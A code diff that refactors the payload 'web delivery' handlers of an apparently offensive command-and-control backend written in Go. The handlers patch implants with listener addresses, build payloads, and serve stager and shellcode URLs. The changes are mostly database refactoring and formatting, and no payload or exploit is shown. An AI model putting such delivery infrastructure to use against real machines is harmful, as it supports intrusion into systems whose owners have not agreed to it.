@@ -13,8 +13,8 @@ import (
 	"sync"
 	"time"
 
-	"github.com/gin-gonic/gin"
 	"BackendTemplate/pkg/utils/logx"
+	"github.com/gin-gonic/gin"
 )
 
 // legacy dedicated-port servers (bind_mode=dedicated)
@@ -101,7 +101,7 @@ func loadAndPatchClient(listener, osType, archType, pass, format string) ([]byte
 // ListWebDelivery 列表
 func ListWebDelivery(c *gin.Context) {
 	var webs []database.WebDelivery
-	database.DB().Find(&webs)
+	webs, _ = database.Deliveries().List()
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": webs})
 }
 
@@ -137,19 +137,19 @@ type startDeliveryRequest struct {
 func StartWebDelivery(c *gin.Context) {
 	var req startDeliveryRequest
 	if err := c.ShouldBindJSON(&req); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 	// 前端从监听器列表选的地址是脱敏值，先还原：否则会把占位符落库并 patch 进载荷
 	req.Listener = resolveListenerAddress(req.Listener, "connect")
 	if req.Listener == "" || req.OS == "" || req.Arch == "" {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "listener/os/arch 必填"})
 		return
 	}
 
 	validatedPath, err := validateDownloadPath(req.DownloadPath, req.OS)
 	if err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 	req.DownloadPath = validatedPath
@@ -164,11 +164,11 @@ func StartWebDelivery(c *gin.Context) {
 		}
 	}
 	if bindMode != "shared" && bindMode != "dedicated" {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "bindMode 仅支持 shared 或 dedicated"})
 		return
 	}
 	if bindMode == "dedicated" && (req.Port == "" || req.Port == "0") {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "dedicated 模式必须指定 port"})
 		return
 	}
 
@@ -178,25 +178,26 @@ func StartWebDelivery(c *gin.Context) {
 		_, exists := WebDeliveryServer[req.Port]
 		Mutex.Unlock()
 		if exists {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口已被占用: " + req.Port})
 			return
 		}
-		var existing database.WebDelivery
-		if has, _ := database.DB().Where("listening_port = ? AND status = 1", req.Port).Get(&existing); has {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
+		// DB 侧再查一次：内存表只反映本进程起的服务，进程重启后残留的
+		// status=1 记录只能靠这条查到
+		if has, _ := database.Deliveries().PortInUse(req.Port); has {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "端口记录已存在: " + req.Port})
 			return
 		}
 	}
 
 	reqFormat := strings.ToLower(strings.TrimSpace(req.Format))
 	if reqFormat != "" && reqFormat != "exe" && reqFormat != "dll" {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "format 仅支持 exe 或 dll"})
 		return
 	}
 
 	patched, binName, err := loadAndPatchClient(req.Listener, req.OS, req.Arch, req.Pass, reqFormat)
 	if err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 
@@ -245,7 +246,7 @@ func StartWebDelivery(c *gin.Context) {
 	// 完整载荷
 	payload, err := delivery.BuildPayload(meta, patched, false)
 	if err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 
@@ -277,9 +278,9 @@ func StartWebDelivery(c *gin.Context) {
 	}
 
 	// 入库
-	if _, err := database.DB().Insert(&meta); err != nil {
+	if _, err := database.Deliveries().Insert(&meta); err != nil {
 		// 无 ID 主键的旧库可能失败；尝试不带 ID
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "写入数据库失败: " + err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "写入数据库失败: " + err.Error()})
 		return
 	}
 
@@ -291,8 +292,8 @@ func StartWebDelivery(c *gin.Context) {
 		if err := startDedicatedServer(meta, payload); err != nil {
 			// 回滚 hub + db
 			delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
-			database.DB().Where("public_key = ?", meta.PublicKey).Delete(&database.WebDelivery{})
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "独立端口启动失败: " + err.Error()})
+			_, _ = database.Deliveries().DeleteByPublicKey(meta.PublicKey)
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "独立端口启动失败: " + err.Error()})
 			return
 		}
 	}
@@ -418,23 +419,13 @@ func CloseWebDelivery(c *gin.Context) {
 		ID        int64  `json:"id"`
 	}
 	if err := c.ShouldBindJSON(&web); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
 		return
 	}
 
-	var meta database.WebDelivery
-	found := false
-	if web.ID > 0 {
-		found, _ = database.DB().ID(web.ID).Get(&meta)
-	}
-	if !found && web.PublicKey != "" {
-		found, _ = database.DB().Where("public_key = ?", web.PublicKey).Get(&meta)
-	}
-	if !found && web.Port != "" {
-		found, _ = database.DB().Where("listening_port = ?", web.Port).Get(&meta)
-	}
+	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
 	if !found {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
 
@@ -448,10 +439,10 @@ func CloseWebDelivery(c *gin.Context) {
 		Mutex.Unlock()
 	}
 	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
-	database.DB().ID(meta.ID).Cols("status").Update(&database.WebDelivery{Status: 2})
+	_, _ = database.Deliveries().SetStatusByID(meta.ID, 2)
 	// legacy rows without id
 	if meta.ID == 0 {
-		database.DB().Where("listening_port = ?", meta.ListeningPort).Cols("status").Update(&database.WebDelivery{Status: 2})
+		_, _ = database.Deliveries().SetStatusByPort(meta.ListeningPort, 2)
 	}
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
@@ -464,29 +455,19 @@ func OpenWebDelivery(c *gin.Context) {
 		ID        int64  `json:"id"`
 	}
 	if err := c.ShouldBindJSON(&web); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
 		return
 	}
 
-	var meta database.WebDelivery
-	found := false
-	if web.ID > 0 {
-		found, _ = database.DB().ID(web.ID).Get(&meta)
-	}
-	if !found && web.PublicKey != "" {
-		found, _ = database.DB().Where("public_key = ?", web.PublicKey).Get(&meta)
-	}
-	if !found && web.Port != "" {
-		found, _ = database.DB().Where("listening_port = ?", web.Port).Get(&meta)
-	}
+	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
 	if !found {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
 
 	patched, _, err := loadAndPatchClient(meta.ListenerConfig, meta.OS, meta.Arch, meta.Pass, inferPayloadFormat(meta.FileName))
 	if err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 	if meta.BindMode == "" {
@@ -503,7 +484,7 @@ func OpenWebDelivery(c *gin.Context) {
 
 	payload, err := delivery.BuildPayload(meta, patched, false)
 	if err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 	if stagerBin, err := delivery.RebuildStagerForURL(meta, meta.ServerAddress); err == nil {
@@ -517,9 +498,9 @@ func OpenWebDelivery(c *gin.Context) {
 
 	meta.Status = 1
 	if meta.ID > 0 {
-		database.DB().ID(meta.ID).Cols("status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode").Update(&meta)
+		_, _ = database.Deliveries().UpdateColumns(meta.ID, []string{"status", "server_address", "stager_url", "shellcode_url", "public_key", "bind_mode"}, &meta)
 	} else {
-		database.DB().Where("listening_port = ?", meta.ListeningPort).Update(&meta)
+		_, _ = database.Deliveries().UpdateByPort(meta.ListeningPort, &meta)
 	}
 
 	delivery.GlobalHub.Register(meta, payload)
@@ -532,7 +513,7 @@ func OpenWebDelivery(c *gin.Context) {
 		}
 		Mutex.Unlock()
 		if err := startDedicatedServer(meta, payload); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 			return
 		}
 	}
@@ -547,20 +528,10 @@ func DeleteWebDelivery(c *gin.Context) {
 		ID        int64  `json:"id"`
 	}
 	if err := c.ShouldBindJSON(&web); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err.Error()})
 		return
 	}
-	var meta database.WebDelivery
-	found := false
-	if web.ID > 0 {
-		found, _ = database.DB().ID(web.ID).Get(&meta)
-	}
-	if !found && web.PublicKey != "" {
-		found, _ = database.DB().Where("public_key = ?", web.PublicKey).Get(&meta)
-	}
-	if !found && web.Port != "" {
-		found, _ = database.DB().Where("listening_port = ?", web.Port).Get(&meta)
-	}
+	meta, found, _ := database.Deliveries().FindAny(web.ID, web.PublicKey, web.Port)
 	if !found {
 		// still try delete by port for legacy
 		if web.Port != "" {
@@ -571,11 +542,11 @@ func DeleteWebDelivery(c *gin.Context) {
 			}
 			Mutex.Unlock()
 			delivery.GlobalHub.Unregister("", web.Port)
-			database.DB().Where("listening_port = ?", web.Port).Delete(&database.WebDelivery{})
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+			_, _ = database.Deliveries().DeleteByPort(web.Port)
+			c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 			return
 		}
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
 
@@ -590,10 +561,11 @@ func DeleteWebDelivery(c *gin.Context) {
 	auditLogEvent("WEBDELIVERY_DELETE", "SUCCESS", "删除投递 "+meta.PublicKey, nil)
 	delivery.GlobalHub.Unregister(meta.PublicKey, meta.ListeningPort)
 	if meta.ID > 0 {
-		database.DB().ID(meta.ID).Delete(&database.WebDelivery{})
-		database.DB().Where("delivery_id = ?", meta.ID).Delete(&database.DeliveryAccessLog{})
+		// 级联删除走领域层：投递记录 + 它的访问日志必须一起清，
+		// 否则日志表会留下指向已删除投递的孤儿行
+		_ = database.Deliveries().DeleteCascade(meta)
 	} else {
-		database.DB().Where("listening_port = ?", meta.ListeningPort).Delete(&database.WebDelivery{})
+		_, _ = database.Deliveries().DeleteByPort(meta.ListeningPort)
 	}
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
@@ -609,17 +581,17 @@ func GetDeliveryCommands(c *gin.Context) {
 	if idStr != "" {
 		id, _ := strconv.ParseInt(idStr, 10, 64)
 		if id > 0 {
-			found, _ = database.DB().ID(id).Get(&meta)
+			found, _ = database.Deliveries().GetByIDOnly(id)
 		}
 	}
 	if !found && key != "" {
-		found, _ = database.DB().Where("public_key = ?", key).Get(&meta)
+		found, _ = database.Deliveries().GetByPublicKeyOnly(key)
 	}
 	if !found && port != "" {
-		found, _ = database.DB().Where("listening_port = ?", port).Get(&meta)
+		found, _ = database.Deliveries().GetByPortOnly(port)
 	}
 	if !found {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
 	// refresh URLs
@@ -656,21 +628,19 @@ func GetDeliveryAccessLogs(c *gin.Context) {
 		}
 	}
 	var logs []database.DeliveryAccessLog
-	q := database.DB().Desc("id").Limit(limit)
+	var filterID int64
 	if idStr != "" {
-		id, _ := strconv.ParseInt(idStr, 10, 64)
-		q = q.Where("delivery_id = ?", id)
-	} else if key != "" {
-		q = q.Where("public_key = ?", key)
+		filterID, _ = strconv.ParseInt(idStr, 10, 64)
 	}
-	_ = q.Find(&logs)
+	logs, _ = database.DeliveryLogs().Page(limit, filterID, key)
 	c.JSON(http.StatusOK, gin.H{"status": 200, "data": logs})
 }
 
 // RestoreWebDeliveriesOnStartup 启动时恢复 status=1 的 shared/dedicated 投递
 func RestoreWebDeliveriesOnStartup() {
 	var list []database.WebDelivery
-	if err := database.DB().Where("status = ?", 1).Find(&list); err != nil {
+	list, err := database.Deliveries().ListOpen()
+	if err != nil {
 		return
 	}
 	for _, meta := range list {
@@ -727,14 +697,10 @@ func cleanupOrphanDelivery(meta *database.WebDelivery) string {
 
 	if listenerType != "" && listenerAddr != "" {
 		// 监听器存在性检查：connect_address 或 listen_address（含 0.0.0.0/:port 变体）
-		var lis database.Listener
-		exists, _ := database.DB().
-			Where("type = ? AND (connect_address = ? OR listen_address = ? OR listen_address = ? OR listen_address = ?)",
-				listenerType, listenerAddr, listenerAddr, "0.0.0.0"+listenerAddr[strings.LastIndex(listenerAddr, ":"):], ":"+listenerAddr[strings.LastIndex(listenerAddr, ":")+1:]).
-			Get(&lis)
+		exists, _ := database.Listeners().ExistsByTypeAndAddrVariants(listenerType, listenerAddr)
 		if !exists {
 			// 监听器已删除：删除残留投递记录（一次性清理）
-			affected, _ := database.DB().Where("public_key = ?", meta.PublicKey).Delete(&database.WebDelivery{})
+			affected, _ := database.Deliveries().DeleteByPublicKey(meta.PublicKey)
 			if affected > 0 {
 				return "关联监听器已删除，已自动清理残留投递记录"
 			}
@@ -743,7 +709,7 @@ func cleanupOrphanDelivery(meta *database.WebDelivery) string {
 	}
 
 	// 监听器仍存在但模板不匹配（旧模板）：禁用投递，避免每次启动重复失败
-	_, err := database.DB().Where("public_key = ?", meta.PublicKey).Update(&database.WebDelivery{Status: 0})
+	_, err := database.Deliveries().SetStatusByKey(meta.PublicKey, 0)
 	if err == nil {
 		return "模板与当前代码不匹配，已禁用（可删除后重新创建投递）"
 	}
@@ -752,7 +718,6 @@ func cleanupOrphanDelivery(meta *database.WebDelivery) string {
 
 // Keep encrypt import used (key path may use in future); silence if unused after refactor
 var _ = encrypt.EncodeBase64
-
 
 // GetDeliveryDefaults 返回全局 delivery（CDN/HTTPS）默认配置，供前端表单预填
 func GetDeliveryDefaults(c *gin.Context) {
@@ -774,7 +739,7 @@ func PreviewDeliveryURLs(c *gin.Context) {
 		PublicKey    string `json:"publicKey"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
-	c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
 		return
 	}
 	req.Listener = resolveListenerAddress(req.Listener, "connect")
@@ -810,7 +775,6 @@ func PreviewDeliveryURLs(c *gin.Context) {
 		},
 	}})
 }
-
 
 // CloseAllWebDeliveryServers 优雅关闭所有 dedicated 投递服务器（进程退出时调用）
 func CloseAllWebDeliveryServers() {
